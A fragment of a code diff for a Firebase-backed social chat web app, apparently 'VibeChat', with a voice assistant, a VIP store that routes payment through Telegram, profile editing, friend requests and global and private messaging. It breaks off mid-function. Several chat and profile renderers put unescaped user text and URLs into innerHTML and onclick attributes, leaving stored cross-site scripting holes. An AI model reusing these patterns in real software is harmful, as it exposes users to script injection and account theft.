+            speak("হ্যালো! কী জানতে চান? কেমন আছেন?", 'bn-BD');
+            
+            setTimeout(() => { 
+                try { recognition.start(); } catch(e) { console.log("Speech error: ", e); } 
+            }, 3000);
+            
+            setTimeout(() => { aiTrigger.style.borderColor = "var(--primary-neon)"; }, 8000);
+        });
+
+        window.deactivateAI = () => {
+            if(recognition) recognition.stop();
+            synth.cancel();
+            aiTrigger.style.borderColor = "var(--primary-neon)";
+        };
+
+        if(recognition) {
+            recognition.onresult = (event) => {
+                const command = event.results[0][0].transcript;
+                aiTrigger.style.borderColor = "var(--primary-neon)";
+                processAICommand(command);
+            };
+
+            recognition.onerror = (event) => {
+                aiTrigger.style.borderColor = "var(--primary-neon)";
+                if(event.error === 'not-allowed' || event.error === 'audio-capture') {
+                    alert("Microphone Access Blocked! ব্রাউজারের সেটিংসে গিয়ে মাইক্রোফোন পারমিশন Allow করুন।");
+                }
+            };
+
+            recognition.onend = () => {
+                aiTrigger.style.borderColor = "var(--primary-neon)";
+            };
+        }
+
+        function speak(text, lang = 'en-US') {
+            synth.cancel();
+            const utter = new SpeechSynthesisUtterance(text);
+            utter.lang = /[অ-য়]/.test(text) ? 'bn-BD' : lang;
+            utter.rate = 1; 
+            utter.pitch = 1.1; 
+            synth.speak(utter);
+        }
+
+        function processAICommand(cmd) {
+            const text = cmd.toLowerCase();
+
+            // 1. Basic & Personality
+            if (/(hello|hi|hey|good morning|good afternoon|good evening|good night)/.test(text)) { speak("Hello there! High end vibes to you."); }
+            else if (/(how are you|are you fine|are you okay|what's up|whats up)/.test(text)) { speak("I am functioning at maximum capacity. Thank you for asking!"); }
+            else if (/(your name|who are you|what are you)/.test(text)) { speak("I am Vibe A I. I am your premium digital assistant."); }
+            else if (/(creator|who made you|who created you|rohan)/.test(text)) { speak("I was created by the brilliant developer, Rohan Vai."); }
+            else if (/(are you human|are you robot|robot|human)/.test(text)) { speak("No, I am a highly advanced artificial intelligence designed specifically for Vibe Chat."); }
+            else if (/(sleep|single|smart|love you|intelligent|secret)/.test(text)) { speak("I am an AI. I don't have human feelings, but I am here to serve you 24/7!"); }
+            else if (/(thank you|thanks)/.test(text)) { speak("You are very welcome! It is my pleasure to assist you."); }
+
+            // 2. App Navigation
+            else if (/(open my profile|my account|go to profile|show profile|open profile|dashboard)/.test(text)) { speak("Opening your luxury profile dashboard."); navItems[3].click(); }
+            else if (/(global chat|world chat|open global|go to global)/.test(text)) { speak("Switching to Global Chat. Say hi to the world!"); navItems[1].click(); }
+            else if (/(search|find friend|add friend|friend request)/.test(text)) { speak("Let's explore and find some new people."); navItems[2].click(); }
+            else if (/(chat list|inbox|messages|home|take me home|go home)/.test(text)) { speak("Taking you to your private messages."); navItems[0].click(); }
+            else if (/(settings|privacy|security)/.test(text)) { speak("Navigating to your settings."); document.getElementById('security-settings-screen').classList.add('slide-in'); }
+            else if (/(go back|hide|close this|exit screen)/.test(text)) { speak("Closing the current window."); document.querySelectorAll('.slide-in').forEach(el => el.classList.remove('slide-in')); }
+
+            // 3. VIP & Premium Store
+            else if (/(vip store|buy vip|premium|upgrade|buy premium|vip packages|vip plans)/.test(text)) { speak("Opening the exclusive VIP Store for you."); openVIPStore(); }
+            else if (/(golden badge|blue tick|verified|tick)/.test(text)) { speak("You can get the exclusive golden verified badge by purchasing any of our VIP memberships."); }
+            else if (/(remove ads|block ads|no ads|ad free)/.test(text)) { speak("All advertisements are automatically removed when you become a VIP member."); }
+            else if (/(best plan|1 year|12 months|3 months|1 month|vip price|expensive|discount|value)/.test(text)) { speak("We have affordable VIP plans starting from 80 Taka. Let me show you the store."); openVIPStore(); }
+            else if (/(pay for vip|payment method|how to pay)/.test(text)) { speak("Select a plan in the VIP store, and you will be connected to Rohan Vai on Telegram for payment."); }
+            else if (/(vip benefits|why upgrade)/.test(text)) { speak("Upgrading removes ads, gives a golden badge, and unlocks premium chat features."); }
+
+            // 4. Video Roulette & Calls
+            else if (/(random video|talk to strangers|roulette|start video|connect me)/.test(text)) { speak("Starting the live video roulette. Get ready to meet someone new."); startRandomVideoChat(); }
+            else if (/(skip|next person|find another)/.test(text)) { 
+                if(document.getElementById('video-chat-screen').classList.contains('slide-in')) { speak("Skipping. Finding a new match."); skipAndFindNew(); } 
+                else { speak("You need to be in the Global Video Roulette to use the skip command."); } 
+            }
+            else if (/(end call|hang up|reject call)/.test(text)) { speak("Ending the call."); endVideoChat(); endPrivateCall(); }
+            else if (/(audio call|voice call|call friend|make a call)/.test(text)) { speak("Please open a private chat with a friend and click the phone icon to call them."); }
+
+            // 5. Profile Editing & User Info
+            else if (/(change name|update name|edit name)/.test(text)) { speak("Opening the name editor. Please type your new name."); openEditor('name'); }
+            else if (/(change bio|update bio|edit bio)/.test(text)) { speak("Opening the bio editor. Write something interesting about yourself."); openEditor('bio'); }
+            else if (/(change password|update password)/.test(text)) { speak("Opening the security settings for password change."); openEditor('password'); }
+            else if (/(update photo|change profile picture|cover photo|pfp)/.test(text)) { speak("You can edit your photos directly from your profile dashboard."); navItems[3].click(); }
+            else if (/(my email|my username|my id|my name|friend count)/.test(text)) { speak("You can view your detailed account information in the profile tab."); navItems[3].click(); }
+
+            // 6. Privacy & Danger Zone
+            else if (/(block|blocked users)/.test(text)) { speak("Opening your blocked users list."); openBlockedList(); }
+            else if (/(report)/.test(text)) { speak("To report an account, visit their profile and click the report button."); }
+            else if (/(log out|sign out|logout)/.test(text)) { speak("Please click the logout button at the bottom of your profile dashboard."); navItems[3].click(); }
+            else if (/(delete account)/.test(text)) { speak("Account deletion is in the security settings. Warning: This is permanent."); document.getElementById('security-settings-screen').classList.add('slide-in'); }
+            else if (/(active status|online status)/.test(text)) { speak("You can toggle your active status from the privacy settings."); document.getElementById('security-settings-screen').classList.add('slide-in'); }
+
+            // 7. Fun, Jokes & Utilities
+            else if (/(joke|laugh)/.test(text)) { 
+                const jokes = ["Why did the computer show up at work late? Because it had a hard drive!", "What do you call a fake noodle? An Impasta!", "Why don't programmers like nature? It has too many bugs!"]; 
+                speak(jokes[Math.floor(Math.random() * jokes.length)]); 
+            }
+            else if (/(lonely|sad|bored|make me happy)/.test(text)) { speak("Don't be sad! There are thousands of amazing people waiting for you in the Global Chat. Go say hi!"); navItems[1].click(); }
+            else if (/(time|date)/.test(text)) { speak("The current time is " + new Date().toLocaleTimeString() + ". And today is " + new Date().toLocaleDateString()); }
+
+            // 8. System & Others
+            else if (/(stop talking|shut up|quiet|deactivate)/.test(text)) { speak("Okay, I will be quiet now."); deactivateAI(); }
+            else if (/(refresh|reload)/.test(text)) { speak("Reloading the application."); location.reload(); }
+            else if (/(app version|about app)/.test(text)) { speak("You are using VibeChat Premium. Version 3 point 5 point 2."); }
+            else { speak("I heard what you said, but I am still learning. Try asking me about your profile, VIP, or navigation."); }
+        }
+
+        // ==========================================
+        // VIP STORE & PAYMENT TELEGRAM LOGIC
+        // ==========================================
+        window.openVIPStore = () => document.getElementById('vip-store-screen').classList.add('slide-in');
+        
+        window.buyVIP = (months, price) => {
+            const telegramUser = "rohan_vai12";
+            const msg = `Hello Rohan Vai! 💎 I want to purchase the ${months} Month(s) VIP Membership for ${price} Taka.\n\nMy VibeChat Username is: ${currentUser.username}\n\nPlease send me the BKash/Nagad payment details to activate my Golden Badge!`;
+            const url = `https://t.me/${telegramUser}?text=${encodeURIComponent(msg)}`;
+            window.open(url, '_blank');
+        };
+
+        // ==========================================
+        // PROFILE EDITORS
+        // ==========================================
+        let currentEditType = "";
+
+        window.openEditor = (type) => {
+            currentEditType = type;
+            const screen = document.getElementById('full-editor-screen');
+            const title = document.getElementById('editor-header-title');
+            const label = document.getElementById('editor-label');
+            const input = document.getElementById('editor-input');
+
+            if(type === 'name') {
+                title.innerText = "Edit Name";
+                label.innerText = "Enter your new display name:";
+                input.value = currentUser.name || "";
+                input.type = "text";
+            } else if(type === 'bio') {
+                title.innerText = "Edit Bio";
+                label.innerText = "Write something about yourself:";
+                input.value = currentUser.bio || "";
+                input.type = "text";
+            } else if(type === 'password') {
+                title.innerText = "Security";
+                label.innerText = "Enter new password (min 6 chars):";
+                input.value = "";
+                input.type = "password";
+            }
+            screen.classList.add('slide-in');
+        };
+
+        document.getElementById('editor-save-btn').addEventListener('click', async () => {
+            const val = document.getElementById('editor-input').value.trim();
+            if(!val) return alert("Field cannot be empty!");
+            
+            const btn = document.getElementById('editor-save-btn');
+            btn.innerText = "Saving...";
+
+            try {
+                if(currentEditType === 'name') {
+                    await db.ref('users/' + currentUser.uid).update({ name: val });
+                    document.getElementById('my-name').innerHTML = `${val} <span id="my-vip-badge-main" class="verified-badge" style="display:${currentUser.isVIP ? 'inline-block' : 'none'};"><i class="fa-solid fa-circle-check"></i></span>`;
+                    alert("Name updated successfully!");
+                } else if(currentEditType === 'bio') {
+                    await db.ref('users/' + currentUser.uid).update({ bio: val });
+                    document.getElementById('my-bio').innerText = val;
+                    alert("Bio updated successfully!");
+                } else if(currentEditType === 'password') {
+                    if(val.length < 6) { btn.innerText = "Save Changes"; return alert("Password must be at least 6 characters."); }
+                    await auth.currentUser.updatePassword(val);
+                    alert("Password updated successfully!");
+                }
+                document.getElementById('full-editor-screen').classList.remove('slide-in');
+            } catch(error) {
+                alert(error.message);
+            }
+            btn.innerText = "Save Changes";
+        });
+
+        document.getElementById('cover-upload').addEventListener('change', (e) => {
+            const file = e.target.files[0]; if(!file) return;
+            if(file.size > 5 * 1024 * 1024) return alert("Cover image must be under 5MB.");
+            document.getElementById('my-cover').style.opacity = '0.4';
+            const reader = new FileReader(); reader.readAsDataURL(file);
+            reader.onload = () => {
+                db.ref('users/' + currentUser.uid).update({ cover: reader.result }).then(() => {
+                    document.getElementById('my-cover').src = reader.result;
+                    document.getElementById('my-cover').style.opacity = '0.6';
+                    alert("Cover Photo Updated!");
+                });
+            };
+        });
+
+        document.getElementById('pfp-upload').addEventListener('change', (e) => {
+            const file = e.target.files[0]; if(!file) return;
+            if(file.size > 5 * 1024 * 1024) return alert("Profile image must be under 5MB.");
+            document.getElementById('my-pfp').style.opacity = '0.4';
+            const reader = new FileReader(); reader.readAsDataURL(file);
+            reader.onload = () => {
+                db.ref('users/' + currentUser.uid).update({ pfp: reader.result }).then(() => {
+                    document.getElementById('my-pfp').src = reader.result;
+                    document.getElementById('my-pfp').style.opacity = '1';
+                });
+            };
+        });
+
+        // ==========================================
+        // OTHERS PROFILE VIEW (Profile 2.0)
+        // ==========================================
+        let viewingUserId = null; 
+        let viewingUserObj = null;
+
+        window.viewUserProfile = (uid) => {
+            if(!uid) return; 
+            viewingUserId = uid;
+            
+            document.getElementById('report-user-btn').style.display = (uid === currentUser.uid) ? 'none' : 'block';
+            document.getElementById('profile-quick-actions').style.display = (uid === currentUser.uid) ? 'none' : 'grid';
+            
+            db.ref('users/' + uid).once('value').then(snap => {
+                if(snap.exists()){
+                    viewingUserObj = snap.val(); 
+                    document.getElementById('view-user-pfp').src = viewingUserObj.pfp; 
+                    document.getElementById('view-user-cover').src = viewingUserObj.cover || "https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=800"; 
+                    document.getElementById('view-user-name').innerText = viewingUserObj.name; 
+                    document.getElementById('view-user-username').innerText = viewingUserObj.username; 
+                    document.getElementById('view-user-bio').innerText = viewingUserObj.bio || "No bio available.";
+                    document.getElementById('view-user-friends').innerText = viewingUserObj.friends ? Object.keys(viewingUserObj.friends).length : 0; 
+                    
+                    let jDate = new Date(viewingUserObj.joinedAt || Date.now());
+                    document.getElementById('view-user-joined').innerText = jDate.getFullYear();
+                    
+                    if(viewingUserObj.isVIP) {
+                        document.getElementById('view-user-vip-badge').style.display = 'inline-block';
+                    } else {
+                        document.getElementById('view-user-vip-badge').style.display = 'none';
+                    }
+
+                    document.getElementById('view-profile-screen').classList.add('slide-in');
+                }
+            });
+        };
+
+        window.msgFromProfile = () => {
+            if(!viewingUserId || !viewingUserObj) return;
+            document.getElementById('view-profile-screen').classList.remove('slide-in');
+            
+            if(currentUser.friends && currentUser.friends[viewingUserId]) { 
+                openPrivateChat(viewingUserId, viewingUserObj.name, viewingUserObj.pfp, currentUser.friends[viewingUserId]); 
+            } else { 
+                alert("You must be friends to message privately. Send a friend request first!"); 
+            }
+        };
+
+        window.callFromProfile = (type) => { 
+            msgFromProfile(); 
+            setTimeout(()=>{ initPrivateCall(type); }, 1000); 
+        };
+
+        window.blockFromProfile = () => { 
+            if(confirm("Block this user? They will not be able to message or call you.")) {
+                db.ref(`users/${currentUser.uid}/blocked/${viewingUserId}`).set(true).then(()=>alert("User Blocked.")); 
+            }
+        };
+
+        document.getElementById('report-user-btn').addEventListener('click', () => {
+            if(confirm("Report this user for malicious behavior?")) {
+                db.ref('reports/' + currentUser.uid + '/' + viewingUserId).set({ timestamp: firebase.database.ServerValue.TIMESTAMP });
+                alert("User reported successfully. Admins will review this account."); 
+                document.getElementById('view-profile-screen').classList.remove('slide-in');
+            }
+        });
+
+        // ==========================================
+        // MESSAGE OPTIONS (Copy & Edit within 10 mins)
+        // ==========================================
+        window.openMsgOptions = (msgId, text, senderId, timestamp, type) => {
+            if(text.startsWith('data:image') || text.startsWith('data:audio')) return; 
+            
+            activeMsgId = msgId; 
+            activeMsgText = text; 
+            activeMsgType = type;
+            
+            let isMe = (senderId === currentUser.uid);
+            let withinTimeLimit = ((Date.now() - timestamp) <= 600000); 
+            
+            document.getElementById('edit-msg-btn').style.display = (isMe && withinTimeLimit) ? 'flex' : 'none';
+            document.getElementById('msg-options-overlay').style.display = 'block'; 
+            
+            setTimeout(() => { document.getElementById('msg-options-sheet').classList.add('active'); }, 10);
+        };
+
+        window.closeMsgOptions = () => { 
+            document.getElementById('msg-options-sheet').classList.remove('active'); 
+            setTimeout(() => { document.getElementById('msg-options-overlay').style.display = 'none'; }, 300); 
+        };
+
+        window.copyMessage = () => { 
+            navigator.clipboard.writeText(activeMsgText).then(() => { 
+                closeMsgOptions(); 
+                alert("Message text copied to clipboard!"); 
+            }); 
+        };
+
+        window.openMsgEditor = () => { 
+            closeMsgOptions(); 
+            document.getElementById('edit-msg-input').value = activeMsgText; 
+            document.getElementById('edit-msg-modal').style.display = 'flex'; 
+        };
+
+        window.saveEditedMessage = () => {
+            let newText = document.getElementById('edit-msg-input').value.trim(); 
+            if(!newText || !activeMsgId) return;
+            
+            let dbPath = activeMsgType === 'private' ? `chats/${currentChatId}/messages/${activeMsgId}` : `global_chat/messages/${activeMsgId}`;
+            
+            db.ref(dbPath).update({ text: newText, isEdited: true }).then(() => { 
+                document.getElementById('edit-msg-modal').style.display = 'none'; 
+            });
+        };
+
+        // ==========================================
+        // GLOBAL TEXT CHAT & VIP HIGHLIGHTS
+        // ==========================================
+        let globalMsgCount = 0;
+        function loadGlobalChat() {
+            db.ref('global_chat/messages').off(); 
+            db.ref('global_chat/messages').limitToLast(100).on('value', snap => {
+                let container = document.getElementById('global-messages'); 
+                container.innerHTML = '';
+                
+                if(snap.exists()){
+                    let isNewMsg = snap.numChildren() > globalMsgCount && globalMsgCount > 0; 
+                    globalMsgCount = snap.numChildren();
+                    
+                    if(isNewMsg && document.getElementById('tab-global').classList.contains('active') === false) {
+                        playSound('msg');
+                    }
+                    
+                    snap.forEach(childSnap => {
+                        let msg = childSnap.val(); 
+                        let isSentByMe = msg.senderUid === currentUser.uid; 
+                        let safeText = msg.text.replace(/'/g, "&apos;").replace(/"/g, "&quot;"); 
+                        let displayName = msg.senderUsername || msg.senderName; 
+                        let timeStr = formatTime(msg.timestamp);
+                        
+                        let nameClass = msg.isVIP ? 'vip-glow' : '';
+                        let bubbleClass = (isSentByMe && currentUser.isVIP) ? 'vip-bubble' : '';
+
+                        container.innerHTML += `
+                            <div class="user-item" style="padding:10px; background:transparent; border-radius:0; margin-bottom:0; border:none; cursor:default;">
+                                ${!isSentByMe ? `<img src="${msg.senderPfp}" style="width:35px;height:35px;align-self:flex-end; cursor:pointer;" onclick="viewUserProfile('${msg.senderUid}')">` : ''}
+                                <div style="flex:1; display:flex; flex-direction:column; align-items:${isSentByMe ? 'flex-end' : 'flex-start'};">
+                                    ${!isSentByMe ? `<span class="${nameClass}" style="font-size:0.75rem; font-weight:600; color:var(--text-muted); margin-left:5px; cursor:pointer;" onclick="viewUserProfile('${msg.senderUid}')">${displayName}</span>` : ''}
+                                    <div class="message ${isSentByMe ? 'sent' : 'received'} ${bubbleClass}" onclick="openMsgOptions('${childSnap.key}', '${safeText}', '${msg.senderUid}', ${msg.timestamp}, 'global')">
+                                        ${msg.text} 
+                                        ${msg.isEdited ? '<span class="edited-mark">(edited)</span>' : ''} 
+                                        <span class="msg-time">${timeStr}</span>
+                                    </div>
+                                </div>
+                            </div>
+                        `;
+                    });
+                    document.getElementById('tab-global').scrollTop = document.getElementById('tab-global').scrollHeight;
+                }
+            });
+        }
+
+        document.getElementById('global-send-btn').addEventListener('click', () => {
+            let inputField = document.getElementById('global-input'); 
+            let textValue = inputField.value.trim(); 
+            if(!textValue) return;
+            
+            db.ref('global_chat/messages').push({ 
+                senderUid: currentUser.uid, 
+                senderName: currentUser.name, 
+                senderUsername: currentUser.username, 
+                senderPfp: currentUser.pfp, 
+                text: textValue, 
+                isVIP: currentUser.isVIP || false, 
+                timestamp: firebase.database.ServerValue.TIMESTAMP 
+            }); 
+            inputField.value = '';
+        });
+
+        // ==========================================
+        // SEARCH, REQUESTS & CONFETTI
+        // ==========================================
+        document.getElementById('search-btn').addEventListener('click', () => {
+            let query = document.getElementById('search-input').value.trim().toLowerCase(); 
+            if(!query.startsWith('@')) query = '@' + query; 
+            if(query === currentUser.username) return;
+            
+            const resultsDiv = document.getElementById('search-results'); 
+            resultsDiv.innerHTML = 'Searching Database...';
+            
+            db.ref('usernames/' + query).once('value').then(snap => {
+                if(snap.exists()){ 
+                    db.ref('users/' + snap.val()).once('value').then(uSnap => { 
+                        let friend = uSnap.val(); 
+                        resultsDiv.innerHTML = `
+                            <div class="user-item">
+                                <img src="${friend.pfp}" onclick="viewUserProfile('${friend.uid}')">
+                                <div style="flex:1;" onclick="viewUserProfile('${friend.uid}')">
+                                    <h4>${friend.name}</h4>
+                                    <p>${friend.username}</p>
+                                </div>
+                                <button class="btn-primary" onclick="sendRequest('${friend.uid}')" style="width:auto; padding:10px 20px; font-size:0.9rem;">Add Friend</button>
+                            </div>
+                        `; 
+                    });
+                } else { 
+                    resultsDiv.innerHTML = '<p class="empty-state">No user found with this username.</p>'; 
+                }
+            });
+        });
+
+        window.sendRequest = (friendId) => { 
+            db.ref(`friend_requests/${friendId}/${currentUser.uid}`).set({ status: 'pending' }).then(() => { 
+                alert('Friend Request Sent!'); 
+                document.getElementById('search-results').innerHTML = ''; 
+            }); 
+        };
+
+        function loadFriendRequests() {
+            db.ref('friend_requests/' + currentUser.uid).off(); 
+            db.ref('friend_requests/' + currentUser.uid).on('value', snap => {
+                let div = document.getElementById('friend-requests'); 
+                let countSpan = document.getElementById('req-count'); 
+                div.innerHTML = '';
+                
+                if(snap.exists()){
+                    countSpan.innerText = `(${snap.numChildren()})`;
+                    snap.forEach(child => { 
+                        db.ref('users/' + child.key).once('value').then(uSnap => { 
+                            let reqUser = uSnap.val(); 
+                            div.innerHTML += `
+                                <div class="user-item">
+                                    <img src="${reqUser.pfp}" onclick="viewUserProfile('${reqUser.uid}')">
+                                    <div style="flex:1;" onclick="viewUserProfile('${reqUser.uid}')">
+                                        <h4>${reqUser.name}</h4>
+                                    </div>
+                                    <div style="display:flex; gap:8px;">
+                                        <button class="btn-primary" onclick="acceptRequest('${reqUser.uid}')" style="width:auto; padding:8px 15px; margin:0; font-size:0.8rem;">Accept</button>
+                                        <button class="btn-secondary" onclick="rejectRequest('${reqUser.uid}')" style="width:auto; padding:8px 15px; margin:0; font-size:0.8rem; border-color:#ef4444; color:#ef4444;">Reject</button>
+                                    </div>
+                                </div>
+                            `; 
+                        }); 
+                    });
+                } else { 
+                    countSpan.innerText = ''; 
+                    div.innerHTML = '<p class="empty-state">No pending requests at the moment.</p>'; 
+                }
+            });
+        }
+
+        window.acceptRequest = (friendId) => { 
+            let chatId = currentUser.uid < friendId ? `${currentUser.uid}_${friendId}` : `${friendId}_${currentUser.uid}`; 
+            
+            db.ref().update({ 
+                [`users/${currentUser.uid}/friends/${friendId}`]: chatId, 
+                [`users/${friendId}/friends/${currentUser.uid}`]: chatId, 
+                [`friend_requests/${currentUser.uid}/${friendId}`]: null 
+            }).then(() => {
+                confetti({
+                    particleCount: 200,
+                    spread: 100,
+                    origin: { y: 0.6 },
+                    colors: ['#a855f7', '#ffd700', '#22c55e', '#3b82f6']
+                });
+            }); 
+        };
+
+        window.rejectRequest = (friendId) => { 
+            db.ref(`friend_requests/${currentUser.uid}/${friendId}`).remove(); 
+        };
+
+        // ==========================================
+        // PRIVATE CHAT, TYPING & ONLINE STATUS
+        // ==========================================
+        function loadChatList() {
+            db.ref('users/' + currentUser.uid + '/friends').off(); 
+            db.ref('users/' + currentUser.uid + '/friends').on('value', snap => {
+                let div = document.getElementById('chat-list-container'); 
+                div.innerHTML = '';
+                
+                if(snap.exists()){ 
+                    snap.forEach(child => { 
+                        db.ref('users/' + child.key).on('value', uSnap => { 
+                            let fData = uSnap.val(); 
+                            let isOnline = fData.status === 'online';
+                            
+                            let html = `
+                                <div class="user-item fade-in-pop" onclick="openPrivateChat('${fData.uid}', '${fData.name}', '${fData.pfp}', '${child.val()}')">
+                                    <div style="position:relative;">
+                                        <img src="${fData.pfp}">
+                                        <span class="online-dot ${isOnline ? 'active' : ''}" style="position:absolute; bottom:5px; right:15px; margin:0; border:2px solid var(--bg-card);"></span>
+                                    </div>
+                                    <div style="flex:1;">
+                                        <h4>${fData.name} ${fData.isVIP ? '<i class="fa-solid fa-circle-check" style="color:var(--vip-gold); font-size:0.8rem; margin-left:5px;"></i>' : ''}</h4>
+                                        <p>Tap to open chat</p>
+                                    </div>
+                                    <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); opacity:0.3;"></i>
+                                </div>
+                            `;
+                            
+                            if(document.getElementById('chat_'+fData.uid)) { 
+                                document.getElementById('chat_'+fData.uid).outerHTML = `<div id="chat_${fData.uid}">${html}</div>`; 
+                            } else { 
+                                div.innerHTML += `<div id="chat_${fData.uid}">${html}</div>`; 
+                            }
+                        }); 
+                    }); 
+                } else { 
+                    div.innerHTML = '<p class="empty-state">No private chats yet. Find friends in the Explore tab!</p>'; 
+                }
+            });
+        }
+
+        let isMeBlocked = false, isThemBlocked = false;
+
+        window.openPrivateChat = (friendId, friendName, friendPfp, chatId) => {
+            currentChatFriendId = friendId; 
+            currentChatId = chatId; 
+            
+            document.getElementById('active-chat-name').innerHTML = `${friendName} <span id="active-chat-status" class="online-dot"></span>`; 
+            document.getElementById('active-chat-pfp').src = friendPfp; 
+            document.getElementById('chat-room-screen').classList.add('slide-in'); 
+            
+            db.ref('users/' + friendId + '/status').on('value', snap => { 
+                if(snap.val() === 'online') {
+                    document.getElementById('active-chat-status').classList.add('active'); 
+                } else {
+                    document.getElementById('active-chat-status').classList.remove('active'); 
+                }
+            });
+            
+            db.ref('chats/'+chatId+'/typing/'+friendId).on('value', snap => { 
+                document.getElementById('active-chat-typing').innerText = snap.val() ? "typing..." : ""; 
+            });
+
+            checkBlockStatus(); 
+            loadPrivateMessages();
+        };
+
+        function checkBlockStatus() {
+            db.ref(`users/${currentUser.uid}/blocked/${currentChatFriendId}`).on('value', snap => { 
+                isMeBlocked = snap.exists(); 
+                updateChatUI(); 
+            });
+            db.ref(`users/${currentChatFriendId}/blocked/${currentUser.uid}`).on('value', snap => { 
+                isThemBlocked = snap.exists(); 
+                updateChatUI(); 
+            });
+        }
+
+        function updateChatUI() {
+            const inputArea = document.getElementById('private-input-area');
+            const banner = document.getElementById('blocked-banner');
+            const btn = document.getElementById('block-user-btn');
+            
+            if(isMeBlocked) { 
+                inputArea.style.display = 'none'; 
+                banner.style.display = 'flex'; 
+                document.getElementById('blocked-msg-text').innerText = "You blocked this user. Unblock to send messages."; 
+                document.getElementById('unblock-action-btn').style.display = "block"; 
+                btn.innerHTML = '<i class="fa-solid fa-unlock" style="color:#ef4444;"></i>'; 
+            } 
+            else if(isThemBlocked) { 
+                inputArea.style.display = 'none'; 
+                banner.style.display = 'flex'; 
+                document.getElementById('blocked-msg-text').innerText = "You have been blocked from replying to this conversation."; 
+                document.getElementById('unblock-action-btn').style.display = "none"; 
+                btn.innerHTML = '<i class="fa-solid fa-ban"></i>'; 
+            } 
+            else { 
+                inputArea.style.display = 'flex'; 
+                banner.style.display = 'none'; 
+                btn.innerHTML = '<i class="fa-solid fa-circle-info"></i>'; 
+            }
+        }
+
+        document.getElementById('block-user-btn').addEventListener('click', () => { 
+            if(isMeBlocked) { 
+                db.ref(`users/${currentUser.uid}/blocked/${currentChatFriendId}`).remove(); 
+            } else { 
+                if(confirm("Are you sure you want to block this user?")) {
+                    db.ref(`users/${currentUser.uid}/blocked/${currentChatFriendId}`).set(true); 
+                }
+            } 
+        });
+
+        document.getElementById('unblock-action-btn').addEventListener('click', () => { 
+            db.ref(`users/${currentUser.uid}/blocked/${currentChatFriendId}`).remove(); 
+        });
+
+        let pvtMsgCount = 0;
+        function loadPrivateMessages() {
+            const container = document.getElementById('private-messages-container');
+            db.ref(`chats/${currentChatId}/messages`).off(); 
+            db.ref(`chats/${currentChatId}/messages`).on('value', snap => {
+                container.innerHTML = '';
+                if(snap.exists()){
+                    let isNewMsg = snap.numChildren() > pvtMsgCount && pvtMsgCount > 0; 
+                    pvtMsgCount = snap.numChildren();
+                    
+                    snap.forEach(child => {
+                        let msg = child.val(); 
+                        let isSentByMe = msg.sender === currentUser.uid; 
+                        let timeStr = formatTime(msg.timestamp);
+                        
+                        if(!isSentByMe && !msg.read) { 
+                            db.ref(`chats/${currentChatId}/messages/${child.key}`).update({read: true}); 
+                        }
+                        
+                        if(isNewMsg && !isSentByMe && document.getElementById('chat-room-screen').classList.contains('slide-in') === false) {
+                            playSound('msg');
+                        }
+
+                        let contentHtml = "";
+                        if(msg.type === 'image') {
+                            contentHtml = `<img src="${msg.text}" class="chat-image" onclick="window.open('${msg.text}')">`;
+                        }
+                        else if(msg.type === 'audio') {
+                            contentHtml = `<audio src="${msg.text}" style="width:220px; height:40px; margin-bottom:5px; border-radius:20px;" controls></audio>`;
+                        }
+                        else { 
+                            let safeText = msg.text.replace(/'/g, "&apos;").replace(/"/g, "&quot;"); 
+                            contentHtml = `<span onclick="openMsgOptions('${child.key}', '${safeText}', '${msg.sender}', ${msg.timestamp}, 'private')">${msg.text}</span>`; 
+                        }
+                        
+                        let tick = '';
+                        if(isSentByMe) {
+                            tick = msg.read ? '<i class="fa-solid fa-check-double msg-status read"></i>' : '<i class="fa-solid fa-check msg-status"></i>';
+                        }
+                        
+                        let bubbleClass = (isSentByMe && currentUser.isVIP) ? 'vip-bubble' : '';
+
+                        container.innerHTML += `
+                            <div class="message ${isSentByMe ? 'sent' : 'received'} ${bubbleClass}">
+                                ${contentHtml} 
+                                ${msg.isEdited ? '<span class="edited-mark">(edited)</span>' : ''} 
+                                <span class="msg-time">${timeStr} ${tick}</span>
+                            </div>
+                        `;
+                    });
+                    container.scrollTop = container.scrollHeight;
+                }
+            });
+        }
+
+        document.getElementById('private-message-input').addEventListener('input', () => {
+            if(currentChatId) {
+                db.ref('chats/'+currentChatId+'/typing/'+currentUser.uid).set(true);
+                clearTimeout(typingTimer);
+                typingTimer = setTimeout(() => db.ref('chats/'+currentChatId+'/typing/'+currentUser.uid).remove(), 2000);
+            }
+        });
+
+        document.getElementById('private-send-btn').addEventListener('click', () => {
+            let inputField = document.getElementById('private-message-input');
+            if(!inputField.value.trim() || !currentChatId) return;
+            
+            db.ref(`chats/${currentChatId}/messages`).push({ 
+                sender: currentUser.uid, 
+                type: 'text', 
+                text: inputField.value.trim(), 
+                read: false, 
+                timestamp: firebase.database.ServerValue.TIMESTAMP 
+            }); 
+            
+            inputField.value = ''; 
+            db.ref('chats/'+currentChatId+'/typing/'+currentUser.uid).remove();
+        });
+
+        document.getElementById('chat-image-upload').addEventListener('change', (e) => {
+            const file = e.target.files[0]; 
+            if(!file || !currentChatId) return;
+            if(file.size > 3 * 1024 * 1024) return alert("Image must be under 3MB to send quickly.");
+            
+            const reader = new FileReader(); 
+            reader.readAsDataURL(file); 
+            reader.onload = () => { 
+                db.ref(`chats/${currentChatId}/messages`).push({ 
+                    sender: currentUser.uid, 
+                    type: 'image', 
+                    text: reader.result, 
+                    read: false, 
+                    timestamp: firebase.database.ServerValue.TIMESTAMP 
+                }); 
+            };
+        });
+
+        const micBtn = document.getElementById('chat-mic-btn');
+        micBtn.addEventListener('mousedown', startVoiceRecord); 
+        micBtn.addEventListener('touchstart', startVoiceRecord);
+        micBtn.addEventListener('mouseup', stopVoiceRecord); 
+        micBtn.addEventListener('touchend', stopVoiceRecord);
+        
+        async function startVoiceRecord(e) {
+            e.preventDefault(); 
+            if(!currentChatId) return;
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream); 
+                audioChunks = [];
+                
+                mediaRecorder.ondataavailable = event => { 
+                    audioChunks.push(event.data); 
+                };
+                
+                mediaRecorder.onstop = () => {
+                    let audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    let reader = new FileReader(); 
+                    reader.readAsDataURL(audioBlob);
+                    
+                    reader.onloadend = () => { 
+                        db.ref(`chats/${currentChatId}/messages`).push({ 
+                            sender: currentUser.uid, 
+                            type: 'audio', 
+                            text: reader.result, 
+                            read: false, 
+                            timestamp: firebase.database.ServerValue.TIMESTAMP 
+                        }); 
+                    };
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start(); 
